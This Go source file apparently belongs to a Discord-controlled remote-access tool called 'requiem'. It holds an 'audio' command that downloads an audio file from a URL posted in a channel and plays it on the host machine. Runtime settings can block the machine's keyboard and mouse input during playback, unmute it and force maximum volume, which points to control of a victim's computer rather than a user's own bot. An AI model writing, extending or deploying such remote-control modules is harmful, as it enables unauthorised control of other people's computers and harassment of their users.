package commands

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"requiem/funcs"
	"requiem/store"
	"requiem/utils"
	"requiem/utils/discord"

	"github.com/bwmarrin/discordgo"
	"github.com/hajimehoshi/go-mp3"
	"github.com/hajimehoshi/oto"
)

var (
	context *oto.Context
	inited  bool = false
)

func (*AudioCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	urls := discord.GetUrls(msg)
	if len(urls) == 0 {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to find any urls.", msg.Reference())
		return
	}

	theUrl := ""

	for _, url := range urls {
		ext := filepath.Ext(strings.Split(url, "?")[0])
		if ext != ".mp3" && ext != ".wav" && ext != ".m4a" {
			continue
		}

		theUrl = url
		break
	}

	if theUrl == "" {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to find any audio files.", msg.Reference())
		return
	}

	path, err := utils.DownloadFile(theUrl, "")
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to download - %s", err), msg.Reference())
		return
	}

	defer os.Remove(path)

	file, err := os.Open(path)
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to open file - %s", err), msg.Reference())
		return
	}

	defer file.Close()

	decoder, err := mp3.NewDecoder(file)
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to decode audio - %s", err), msg.Reference())
		return
	}

	if !inited {
		context, err = oto.NewContext(decoder.SampleRate(), 2, 2, 8192)
		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to create audio context - %s", err), msg.Reference())
			return
		}

		inited = true
	}

	initial, _ := ses.ChannelMessageSendReply(msg.ChannelID, "Playing audio...", msg.Reference())

	if store.RuntimeSettings.AudioDisableInputsUntilFinished {
		funcs.DisableInputs(true)
	}

	if store.RuntimeSettings.AudioUnmuteBeforePlay {
		funcs.SetMuted(false)
	}

	if store.RuntimeSettings.AudioMaxVolumeBeforePlay {
		funcs.SetVolume(1)
	}

	player := context.NewPlayer()
	defer player.Close()

	buffer := make([]byte, 4096)

	for {
		at, err := decoder.Read(buffer)
		if err == io.EOF {
			break
		}

		if err != nil {
			ses.ChannelMessageDelete(msg.ChannelID, initial.ID)
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to read audio - %s", err), msg.Reference())
			return
		}

		_, err = player.Write(buffer[:at])
		if err != nil {
			ses.ChannelMessageDelete(msg.ChannelID, initial.ID)
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to write audio data - %s", err), msg.Reference())
			return
		}
	}

	if store.RuntimeSettings.AudioDisableInputsUntilFinished {
		funcs.DisableInputs(false)
	}

	ses.ChannelMessageDelete(msg.ChannelID, initial.ID)
	ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully played audio.", msg.Reference())
}

func (*AudioCommand) Name() string {
	return "audio"
}

func (*AudioCommand) Info() string {
	return "Plays audio."
}

type AudioCommand struct{}
